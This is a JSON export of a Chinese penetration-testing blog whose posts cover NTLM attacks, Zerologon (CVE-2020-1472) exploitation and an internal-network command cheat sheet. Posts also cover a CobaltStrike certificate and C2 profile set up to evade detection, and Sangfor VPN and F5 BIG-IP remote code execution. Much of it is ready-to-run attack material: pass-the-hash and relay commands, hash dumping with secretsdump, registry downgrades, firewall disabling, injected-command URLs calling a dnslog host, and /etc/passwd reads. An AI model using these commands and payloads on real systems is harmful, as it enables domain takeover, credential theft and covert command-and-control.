{"meta":{"title":"dr1nkw4ter's Blog","subtitle":"","description":"","author":"John Doe","url":"https://www.urso.dog","root":"/"},"pages":[{"title":"404 Not Found：该页无法显示","date":"2020-07-02T10:27:30.544Z","updated":"2020-07-02T06:38:17.176Z","comments":false,"path":"/404.html","permalink":"https://www.urso.dog/404.html","excerpt":"","text":""},{"title":"whoami","date":"2021-02-25T02:31:25.516Z","updated":"2021-02-25T02:31:25.508Z","comments":false,"path":"about/index.html","permalink":"https://www.urso.dog/about/index.html","excerpt":"","text":"干啥啥不行、吃饭第一名！"},{"title":"友情链接","date":"2020-07-02T10:27:30.578Z","updated":"2020-07-02T06:38:17.177Z","comments":true,"path":"links/index.html","permalink":"https://www.urso.dog/links/index.html","excerpt":"","text":""},{"title":"标签","date":"2020-07-02T10:27:30.592Z","updated":"2020-07-02T06:38:17.177Z","comments":false,"path":"tags/index.html","permalink":"https://www.urso.dog/tags/index.html","excerpt":"","text":""},{"title":"分类","date":"2020-07-02T15:12:09.662Z","updated":"2020-07-02T06:38:17.177Z","comments":false,"path":"categories/index.html","permalink":"https://www.urso.dog/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"NTLM认证及其利用点","slug":"ntlm-relay","date":"2020-12-24T09:19:09.000Z","updated":"2021-02-25T02:45:02.280Z","comments":true,"path":"2020/12/24/ntlm-relay/","link":"","permalink":"https://www.urso.dog/2020/12/24/ntlm-relay/","excerpt":"","text":"##NTLM认证在内网中的角色 微软采用 Kerberos 作为 Windows 2000及之后的活动目录域的默认认证协议。当某个服务器隶属于一个Windows AD域或者通过某种方式（如Linux到Windows AD的认证）与Windows 服务器域建立了信任关系的时候，通常采用Kerberos作为认证协议。但是无论你是否拥有活动目录域，NTLM都可以被采用。 拓展知识：Kerberos认证和NTLM认证都是基于SSPI（Security Support Provider Interface:Windows 定义的一套接口，此接口定义了与安全有关的功能函数， 用来进行身份验证、信息完整性验证、保护信息隐私等安全功能）实现的验证机制，即SSP(Security Support Provider)。NTLM SSP 是一种 Challenge/Response 验证机制。Kerberos SSP是基于 ticket 的身份验证机制。 NTLM认证过程NTLM Hash，在LM Hash算法被弃用后，NTLM Hash被用来进行Windows本地及网络认证的凭据，长度为32bit。 例： 123admin -&gt; hex(16进制编码) &#x3D; 61646d696e 61646d696e -&gt; Unicode &#x3D; 610064006d0069006e00 610064006d0069006e00 -&gt; MD4 &#x3D; 209c6174da490caeb422f3fa5a7ae634 当作为本地认证时，流程如下： 1winlogon.exe（用户输入密码）-&gt; lsass.exe（接受用户输入的明文密码并将其加密为hash）-&gt; 然后与sam文件中的hash进行比较，相同通过。 作为网络认证时： 1234561、客户端向服务端发起协商消息，包含客户端支持和向服务器请求的功能列表，包括用户名等。2、服务器对消息进行响应，包括服务器支持和同意的功能列表，重点包含服务器产生的Challenge。3、客户端接收到challenge之后，将用户hash与challenge进行加密运算得到response，将response,username,challenge发给服务器。4.1、服务器收到响应之后，使用challenge和用户hash进行加密得到response与发来的response进行比较，如果相同就会通过。（工作组场景）4.2、如果用户hash存储在域控里面，那么服务端没有用户hash，无法计算response进行验证。这个时候用户服务器就会通过netlogon协议联系域控，建立一个安全通道,然后将1、2、3全部发给域控(这个过程也叫作Pass Through Authentication认证流程)。5、域控使用challenge和用户hash进行加密得到response，与3中的response进行比较。 此处使用用户hash与challenge进行加密运算得到的response中包含有net-ntlm hash,根据NTLM v1响应和NTLMv2响应的区别分为Net-ntlm hash v1和Net-ntlm hash v2。两者加密算法不同，challenge位数不同：v1 challenge为8位、v2 challenge为16位。 其中各版本windows默认发送的ntlm认证协议版本： Windows 2000 、 Windows XP: 发送 LM &amp; NTLM 响应 Windows Server 2003: 仅发送 NTLM 响应 Windows Vista、Windows Server 2008、Windows 7 以及 Windows Server 2008 R2及以上: 仅发送 NTLMv2 响应 注：NTLM将自动以当前用户的账号和密码作为凭证来进行上面的操作，其认证方式有三种： 1、不使用NTLM身份验证2、先尝试NTLM身份验证,认证失败,再采用用户名和密码（默认方式）3、仅使用NTLM身份验证 ##NTLM认证过程中带来的问题 PTH（hash传递）从认证过程来看，hash与challenge进行加密运算得到response是认证关键，而这个过程并没有密码明文的存在，也就是说我们使用hash就可以模拟用户登录。适用于没有明文，仅知道hash的场景。 前提条件：用户名及对应ntlm hash。 mimikatz： 目标不是域用户而是本地用户时，domain跟主机名 1mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::pth&quot; &#x2F;user:win8 &#x2F;domain:study.com &#x2F;ntlm:74cd8298c79e17d6ca9d4ad7e8a75235 kb2871997 微软2014年5月13日发布了针对Pass The Hash的更新补丁kb2871997，但是对于本地Administrator(rid为500)和本地管理员组的域用户依旧能够进行hash 传递。 原理： 对于远程连接到Windows Vista +计算机的任何非RID 500本地管理员帐户，无论是通过WMI，PSEXEC还是其他方法(例外：RDP远程登录)，即使用户是本地管理员，返回的令牌都是已过滤的管理员令牌，即受到uac的限制。 对于本地“管理员”组中的域用户帐户：当具有域用户帐户的用户远程登录Windows Vista计算机并且该用户是Administrators组的成员时，域用户将在远程计算机上以完全管理员访问令牌运行，并且该用户的UAC被禁用在该会话的远程计算机上。 ###NET_NTLM的利用 破解NET_NTLM HASH相关协议：LLMNR、NBNS、MDNS 攻击机：192.168.31.1 受害机：192.168.31.144 使用responder建立监听，指定网卡 在受害机器使用net use连接不存在的网络名 responder获得到net_ntlm hash，当Responder重复获取到同一个用户时不会再显示。 使用hashcat对hash进行破解 1hashcat64.exe -m 5600 hash .&#x2F;passwd.txt -o out.txt —-force -m为加密类型，5600对应的就是NetNTLMv2 -o为破解出的结果 –force忽略警告 passwd.dict为字典 成功破解出密码为1qaz@WSX。此处为Net-NTLM v2 hash，一般都是利用hashcat 爆破明文密码，取决于密码强度。如果是 Net-NTLM v1 hash 理论上都可以还原为ntlm_hash。目前win server 2008及以后的windows版本默认均是使用NetNTLMv2的，默认使用NTLMv1的有2003、XP这些机器，如果想要降级到Net-NTLM v1，首先需要获得当前系统的管理员权限。 将win7的v2降级为v1(管理员权限): 1、临时降级： 1reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ &#x2F;v lmcompatibilitylevel &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f 2、确保降级成功： 123reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ &#x2F;v lmcompatibilitylevel &#x2F;t REG_DWORD &#x2F;d 2 &#x2F;freg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0\\ &#x2F;v NtlmMinClientSec &#x2F;t REG_DWORD &#x2F;d 536870912 &#x2F;freg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0\\ &#x2F;v RestrictSendingNTLMTraffic &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f 此时开启responder要加上–lm参数(仅用于smb协议)，是为了获得指定ntlmv1加密方式下的hash，这种方式下的hash解密难度较小且可以免费解密。 转化格式为NTHASH:LMHASH,上图为：NTHASH:D58B7A9A242683185CB43B0116E2C676DBA74B7348D2DC6E 至https://crack.sh/get-cracking/解密: 此时发生了尴尬的一幕： 刚开始以为是我密码强度太高，但更换密码之后依旧如此，使用别人之前成功解密的v1hash也不能再次解密成功….(站点问题？) ####NTLM_RELAY ntlm relay的过程： 很明显就是一个中间人攻击的过程，但要明确ntlm是一个用来的作为认证的嵌入式协议，如果ntlm的上层协议是smb的情况下,ntlmrelay就是smb relay。那如果上层协议是http，我们也可以叫做http relay，但是统称为ntlm relay。 如何在内网中触发ntlm请求： 此篇文章已有详细的介绍：https://www.anquanke.com/post/id/193493#h2-6 当字典不够强大时，可以考虑不进行破解，转而进行中继。以smbrelay为例：被攻击机器不能开启SMB签名。默认不开启，但是在域中域控是默认开启的。所以在域中通常就是中继管理组成员到一些敏感的机器上。 使用responder配套工具RunFinger检测是否开启smb签名： 发现192.168.31.144未开启smb签名。 ######工作组 在工作组当中只能够中继sid 500 administrator账户，成功的条件是被欺骗机器的administrator密码和被攻击主机的administrator密码相同！ ######域内： 攻击机：192.168.31.1 受害者机器：192.168.31.144 域控：192.168.31.150 首先关掉responder的SMB和HTTP服务器，否则端口占用会和Multi-relay之间产生一些冲突。修改 开启responder： 使用MultiRelay.py，-t为目标主机， -u ALL为relay任意用户的凭证，可以指定某一用户。 1sudo python2 MultiRelay.py -t 192.168.31.144 -u ALL 在域控上发起ntlm请求，成功获取到目标主机权限 multirelay集成了mimikatz可以直接抓密码： ​ 域控或者域管理员组的成员的NET-NTLM Hash 是可以进行中继攻击的，一般利用流程是中继域控NET-NTLM HASH到敏感机器，前提是目标机器不能开smb签名。 参考链接1.https://www.anquanke.com/post/id/194069#h3-6 2.https://xz.aliyun.com/t/8562","categories":[{"name":"内网渗透","slug":"内网渗透","permalink":"https://www.urso.dog/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"中间人","slug":"中间人","permalink":"https://www.urso.dog/tags/%E4%B8%AD%E9%97%B4%E4%BA%BA/"}]},{"title":"NetLogon特权提升漏洞(CVE-2020-1472)","slug":"NetLogon特权提升漏洞-CVE-2020-1472","date":"2020-09-17T08:21:29.000Z","updated":"2020-09-23T14:54:45.998Z","comments":true,"path":"2020/09/17/NetLogon特权提升漏洞-CVE-2020-1472/","link":"","permalink":"https://www.urso.dog/2020/09/17/NetLogon%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-CVE-2020-1472/","excerpt":"","text":"漏洞描述​ 在活动目录中比较重要的一个服务Netlogon，此服务在DC和域成员服务器上运行，为域身份验证提供重要服务，以及复制数据库以进行域控备份，同时还用于维护域成员与域之间、域与域控之间、域DC与跨域DC之间的关系如果此服务停止成员服务器将无法登陆到域中. ​ 此漏洞是微软8月份发布安全公告披露的紧急漏洞，漏洞评分10分，未经身份认证的攻击者可通过使用 Netlogon 远程协议（MS-NRPC）连接域控制器来利用此漏洞。成功利用此漏洞的攻击者可获得域管理员访问权限。 影响版本 Windows Server 2008 R2 for x64-based Systems Service Pack 1 Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation) Windows Server 2012 Windows Server 2012 (Server Core installation) Windows Server 2012 R2 Windows Server 2012 R2 (Server Core installation) Windows Server 2016 Windows Server 2016 (Server Core installation) Windows Server 2019 Windows Server 2019 (Server Core installation) Windows Server, version 1903 (Server Core installation) Windows Server, version 1909 (Server Core installation) Windows Server, version 2004 (Server Core installation) 漏洞利用环境介绍：目标DC（win2012、ip：192.168.1.9）、本机win10（非域内） poc：https://github.com/SecuraBV/CVE-2020-1472 exp：https://github.com/blackarrowsec/redteam-research/tree/master/CVE-2020-1472 ​ https://github.com/VoidSec/CVE-2020-1472 dumphash：impacket中的secretsdump.py 直接dumphash需要认证： 1、执行exp，会将域控的机器账户密码重置为空，此处为DC$： 1python CVE-2020-1472.py DC DC$ 192.168.1.9 2、使用空密码连接dump域控hash： 1python secretsdump.py study.com&#x2F;DC$@192.168.1.9 -no-pass （dump所有hash，仅dump域控-just-dc） 3、域控的机器账户密码已为空（31d6cfe0d16ae931b73c59d7e0c089c0）： 4、使用wmiexec对域管pth连接域控： 1wmiexec.exe study&#x2F;administrator@192.168.1.9 -hashes lm:ntlm 5、获取域控sam文件，读取机器账号原始hash： 123456789reg save HKLM\\SYSTEM system.savereg save HKLM\\SAM sam.savereg save HKLM\\SECURITY security.saveget system.saveget sam.saveget security.savedel &#x2F;f system.savedel &#x2F;f sam.savedel &#x2F;f security.save 6、读取sam文件：（注：参数加了security才可以读到机器账号hash） 1python secretsdump.py -sam sam.save -system system.save -security security.save local 机器账号原始hash： 7、还原机器账号hash： 1python reinstall_original_pw.py DC 192.168.1.9 10f9aa84af2deefe68441de3b017879b 8、查看DC$密码： 参考链接1.https://blog.csdn.net/weixin_45728976/article/details/107965579 2.https://blog.csdn.net/lhh134/article/details/108630955","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://www.urso.dog/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"权限提升","slug":"权限提升","permalink":"https://www.urso.dog/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"}]},{"title":"内网渗透命令速查","slug":"内网渗透命令速查","date":"2020-07-21T12:06:17.000Z","updated":"2020-10-12T02:04:19.093Z","comments":true,"path":"2020/07/21/内网渗透命令速查/","link":"","permalink":"https://www.urso.dog/2020/07/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/","excerpt":"","text":"信息收集本机信息收集查看补丁情况1systeminfo 查看计划任务：1schtasks &#x2F;query &#x2F;fo LIST &#x2F;V 查看安装软件信息：12wmic product get name,versionpowershell &quot;Get-WmiObject -class Win32_Product |Select-Object -Property name,version&quot; 查看本机器服务：1wmic service list brief 查看进程：12tasklist &#x2F;vwmic process list brief 当前在线用户：1query user || qwinsta 查看杀软12WMIC &#x2F;Node:localhost &#x2F;Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName &#x2F;Format:Listtasklist &#x2F;svc 查看开机启动程序信息 ：1wmic startup get command,caption 开机时间：1net statistics workstation (管理员权限)与本机连接的客户端会话：1net session 查询补丁：12systeminfowmic qfe get Caption,Description,HotFixID,InstalledOn 查看防火墙配置：1netsh fifirewall show config 修改防火墙：123netsh advfirewall firewall 【命令】 rule 【其他参数】&#x2F;&#x2F;dir&#x3D;out为出站，in为入站，name&#x3D;all为全部netsh advfirewall firewall add rule name&#x3D;&quot;pass nc&quot; dir&#x3D;in action&#x3D;allow program&#x3D;&quot;C:\\nc.exe&quot; &#x2F;&#x2F;2003以下netsh advfirewall firewall add rule name&#x3D;&quot;Remote 3389&quot; protocol&#x3D;TCP dir&#x3D;in localport&#x3D;3389 action&#x3D;allow &#x2F;&#x2F;2003以上（管理员） 关闭防火墙：12netsh firewall set opmode disable &#x2F;&#x2F;2003以下netsh advfirewall set allprofiles state off &#x2F;&#x2F;2003以上（管理员） 查看远程连接端口：1REG QUERY &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp&quot; &#x2F;V PortNumber &#x2F;&#x2F;0xd3d代表3389 开启远程连接：12345wmic path win32_terminalservicesetting where (__CLASS !&#x3D;&quot;&quot;) call setallowtsconnections 1 &#x2F;&#x2F;2003以下------------------2003以上，需要管理员权限wmic &#x2F;namespace:\\\\root\\cimv2\\terminalservices path win32_terminalservicesetting where (__CLASS !&#x3D;&quot;&quot;) call setallowtsconnections 1 wmic &#x2F;namespace:\\\\root\\cimv2\\terminalservices path win32_tsgeneralsetting where (TerminalName&#x3D;&#39;RDP-Tcp&#39;) call setuserauthenticationrequired 1 REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f &#x2F;&#x2F;0开，1关 查看代理设置情况：1reg query &quot;HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings&quot; 查看rdp连接凭证1cmdkey &#x2F;list 域内信息收集是否为域环境1234ipconfig &#x2F;allsysteminfonet config workstationnet time &#x2F;domain 查询域内机器12345net view 1、键入不带参数的net view显示当前域的计算机列表。 2、\\\\computername 指定要查看其共享资源的计算机。 3、&#x2F;domain[domainname]指定要查看其可用计算机的域dsquery computer 获取域sid1whoami &#x2F;all 查看域内组1net group &#x2F;domain &#x2F;&#x2F;Domain Admins 和 Enterprise Admins 对 DC有完全控制权 查看域管理员详细信息12net group &quot;domain admins&quot;&#x2F;domain &gt; admin.txtfor &#x2F;f %i in (admin.txt) do net user %i &#x2F;domain &gt;&gt;user.txt 查看域密码策略1net accounts &#x2F;domain 查看域信任关系1nltest &#x2F;domain_trusts 查看域用户123net user &#x2F;domainwmic useraccount get &#x2F;alldsquery user 查找域控机器名12nltest &#x2F;DCLIST:域名nslookup -type&#x3D;SRV _ldap._tcp 查看域控制器组12net group &quot;domain controllers&quot; &#x2F;domainnetdom query pdc 待补充…….","categories":[{"name":"内网渗透","slug":"内网渗透","permalink":"https://www.urso.dog/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"信息收集","slug":"信息收集","permalink":"https://www.urso.dog/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}]},{"title":"CobaltStrike证书修改","slug":"CobaltStrike证书修改","date":"2020-07-20T02:43:24.000Z","updated":"2021-01-14T13:46:06.179Z","comments":true,"path":"2020/07/20/CobaltStrike证书修改/","link":"","permalink":"https://www.urso.dog/2020/07/20/CobaltStrike%E8%AF%81%E4%B9%A6%E4%BF%AE%E6%94%B9/","excerpt":"","text":"为什么要修改？1、CS的客户端和服务端通过ssl进行加密通讯，默认的证书配置文件导致很容易被各类检测设备识别。 2、除了修改如上所说的ssl证书外，cs中使用https上线有独立的证书，这个证书也需要修改用来防止被识别。 修改方法ssl加密证书创建服务端证书文件: 1keytool -keystore .&#x2F;cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias test -dname &quot;CN&#x3D;(名字与姓氏), OU&#x3D;(组织单位名称), O&#x3D;(组织名称), L&#x3D;(城市或区域名称), ST&#x3D;(州或省份名称), C&#x3D;(单位的两字母国家代码)&quot;&#96; 以下命令进行导入: 1keytool -importkeystore -srckeystore .&#x2F;cobaltstrike.store -destkeystore .&#x2F;cobaltstrike.store -deststoretype pkcs12 查看证书文件: 修改teamserver文件，端口建议一并修改： 结果展示： https上线使用的证书修改https上线的证书需要修改Malleable C2 profile 关于Cobalt Strike Malleable C2 配置的文档介绍：https://www.chabug.org/web/832.html 本文使用如下配置（修改里面的https-certificate）： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485set sample_name &quot;tryblog POS Malware&quot;;set sleeptime &quot;5000&quot;; # use a ~30s delay between callbacksset jitter &quot;10&quot;; # throw in a 10% jitterset useragent &quot;Mozilla&#x2F;5.0 (Windows NT 6.1; rv:24.0) Gecko&#x2F;20100101 Firefox&#x2F;24.0&quot;; #设置证书，注意以下内容得和你之前生成的证书一样：CN&#x3D;Jhon, OU&#x3D;Advanced, O&#x3D;Chrome, L&#x3D;Somewhere, S&#x3D;Cyberspace, C&#x3D;Earth,这里是自己设定的自签名证书https-certificate &#123; set CN &quot;Jhon&quot;; set O &quot;Chrome&quot;; set C &quot;Earth&quot;; set L &quot;Somewhere&quot;; set OU &quot;Advanced&quot;; set ST &quot;Cyberspace&quot;; set validity &quot;365&quot;;&#125;#设置，修改成你的证书名称和证书密码：CN&#x3D;Jhon, OU&#x3D;Advanced, O&#x3D;Chrome, L&#x3D;Somewhere, S&#x3D;Cyberspace, C&#x3D;Earthcode-signer&#123; set keystore &quot;cobaltstrike.store&quot;; set password &quot;123456&quot;; set alias &quot;test&quot;;&#125; #指定DNS beacon不用的时候指定到IP地址set dns_idle &quot;8.8.4.4&quot;; #每个单独DNS请求前强制睡眠时间set dns_sleep &quot;0&quot;; #通过DNS上载数据时主机名的最大长度[0-255]set maxdns &quot;235&quot;;#https上线使用的证书，这里是Valid SSL Certificates with SSL Beacon(即有效的证书），之前通过keytool设置的证书也可以用的上，但这里是让用真实的证书https-certificate &#123; set keystore &quot;cobaltstrike.store&quot;; set password &quot;123456&quot;;&#125;http-post &#123; set uri &quot;&#x2F;windebug&#x2F;updcheck.php &#x2F;aircanada&#x2F;dark.php &#x2F;aero2&#x2F;fly.php &#x2F;windowsxp&#x2F;updcheck.php &#x2F;hello&#x2F;flash.php&quot;; client &#123; header &quot;Accept&quot; &quot;text&#x2F;plain&quot;; header &quot;Accept-Language&quot; &quot;en-us&quot;; header &quot;Accept-Encoding&quot; &quot;text&#x2F;plain&quot;; header &quot;Content-Type&quot; &quot;application&#x2F;x-www-form-urltrytryd&quot;; id &#123; netbios; parameter &quot;id&quot;; &#125; output &#123; base64; prepend &quot;&amp;op&#x3D;1&amp;id&#x3D;vxeykS&amp;ui&#x3D;Josh @ PC&amp;wv&#x3D;11&amp;gr&#x3D;backoff&amp;bv&#x3D;1.55&amp;data&#x3D;&quot;; print; &#125; &#125; server &#123; output &#123; print; &#125; &#125;&#125; http-get &#123; set uri &quot;&#x2F;updates&quot;; client &#123; metadata &#123; netbiosu; prepend &quot;user&#x3D;&quot;; header &quot;Cookie&quot;; &#125; &#125; server &#123; header &quot;Content-Type&quot; &quot;text&#x2F;plain&quot;; output &#123; base64; print; &#125; &#125;&#125; 使用c2lint 效验刚刚生成C2.profile：1.&#x2F;c2lint C2.profile 效验成功截图： 使用证书启动teamserver1nohup .&#x2F;teamserver 1.1.2.3 123456 .&#x2F;C2.profile &amp; 参考链接1、https://mp.weixin.qq.com/s/5MWDXN3eCaw9m-XHDGaXcQ 2、https://blog.csdn.net/shuteer_xu/article/details/106435793 3、https://blog.csdn.net/qq_41874930/article/details/107791606","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://www.urso.dog/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"工具","slug":"工具","permalink":"https://www.urso.dog/tags/%E5%B7%A5%E5%85%B7/"}]},{"title":"SXF-vpn远程命令执行","slug":"SXF-vpn远程命令执行","date":"2020-07-07T08:41:36.000Z","updated":"2020-09-23T14:55:01.242Z","comments":true,"path":"2020/07/07/SXF-vpn远程命令执行/","link":"","permalink":"https://www.urso.dog/2020/07/07/SXF-vpn%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","excerpt":"","text":"POC:https://ip/por/checkurl.csp?url=1.1.1.1;ping%20hpe7ow.dnslog.cn 复现：","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://www.urso.dog/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"命令执行","slug":"命令执行","permalink":"https://www.urso.dog/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"}]},{"title":"Big-ip远程代码执行&本地文件读取","slug":"Big-ip远程代码执行-本地文件读取","date":"2020-07-07T04:23:41.000Z","updated":"2020-09-23T14:55:06.004Z","comments":true,"path":"2020/07/07/Big-ip远程代码执行-本地文件读取/","link":"","permalink":"https://www.urso.dog/2020/07/07/Big-ip%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/","excerpt":"","text":"漏洞描述F5 BIG-IP 是美国F5公司一款集成流量管理、DNS、出入站规则、web应用防火墙、web网关、负载均衡等功能的应用交付平台。 在 F5 BIG-IP 产品的流量管理用户页面 (TMUI)/配置实用程序的特定页面中存在一处远程代码执行漏洞。 未授权的远程攻击者通过向该页面发送特制的请求包，可以造成任意Java 代码执行。进而控制 F5 BIG-IP 的全部功能，包括但不限于: 执行任意系统命令、开启/禁用服务、创建/删除服务器端文件等。 影响版本 BIG-IP 15.x: 15.1.0/15.0.0 BIG-IP 14.x: 14.1.0 ~ 14.1.2 BIG-IP 13.x: 13.1.0 ~ 13.1.3 BIG-IP 12.x: 12.1.0 ~ 12.1.5 BIG-IP 11.x: 11.6.1 ~ 11.6.5 网络空间搜索引擎： title=&quot;BIG-IP&amp;reg;- Redirect&quot; 漏洞复现poc： 12RCE：https:&#x2F;&#x2F;&lt;ip&gt;&#x2F;tmui&#x2F;login.jsp&#x2F;..;&#x2F;tmui&#x2F;locallb&#x2F;workspace&#x2F;tmshCmd.jsp?command&#x3D;list+auth+user+adminLFI：https:&#x2F;&#x2F;&lt;IP&gt;&#x2F;tmui&#x2F;login.jsp&#x2F;..;&#x2F;tmui&#x2F;locallb&#x2F;workspace&#x2F;fileRead.jsp?fileName&#x3D;&#x2F;etc&#x2F;passwd 目标站点： LFI： RCE（能够LFI不一定能RCE，另外此处的代码执行指的是V11 TMSH命令行： 执行系统命令：逐次执行以下语句：开启bash-&gt;在可执行目录下创建文件并写入命令-&gt;命令执行-&gt;还原 1234tmshCmd.jsp?command&#x3D;create+cli+alias+private+list+command+bashfileSave.jsp?fileName&#x3D;&#x2F;tmp&#x2F;cmd&amp;content&#x3D;idtmshCmd.jsp?command&#x3D;list+&#x2F;tmp&#x2F;cmdtmshCmd.jsp?command&#x3D;delete+cli+alias+private+list 补充：部分能够执行文件读取但是不能执行命令的情况，是因为该后台没有初始化，也就是说该后台从未被登录过。而第一步开启bash的功能需要初始化后才可以成功。此处后台的默认账户是admin，密码和系统root密码相同，可以尝试弱口令、执行list+auth+user+admin或者读取shadow文件(一般是没有权限的)解密后登录web端。第一次登录需要强制修改web登录密码，配置完成后登录后台会自动完成初始化。 修复方式升级至如下版本11.6.5.2, 12.1.5.2, 13.1.3.4, 14.1.2.6, 15.1.0.4 参考链接1.https://blog.csdn.net/wuyou1995/article/details/107170186/ 2.https://clouddocs.f5.com/api/tmsh/ 3.https://mp.weixin.qq.com/s/LczKnV5f7T-0Nw7p4q_0wg","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://www.urso.dog/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"代码执行","slug":"代码执行","permalink":"https://www.urso.dog/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"}]}],"categories":[{"name":"内网渗透","slug":"内网渗透","permalink":"https://www.urso.dog/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"},{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://www.urso.dog/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"渗透测试","slug":"渗透测试","permalink":"https://www.urso.dog/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"中间人","slug":"中间人","permalink":"https://www.urso.dog/tags/%E4%B8%AD%E9%97%B4%E4%BA%BA/"},{"name":"权限提升","slug":"权限提升","permalink":"https://www.urso.dog/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"},{"name":"信息收集","slug":"信息收集","permalink":"https://www.urso.dog/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"name":"工具","slug":"工具","permalink":"https://www.urso.dog/tags/%E5%B7%A5%E5%85%B7/"},{"name":"命令执行","slug":"命令执行","permalink":"https://www.urso.dog/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"name":"代码执行","slug":"代码执行","permalink":"https://www.urso.dog/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"}]}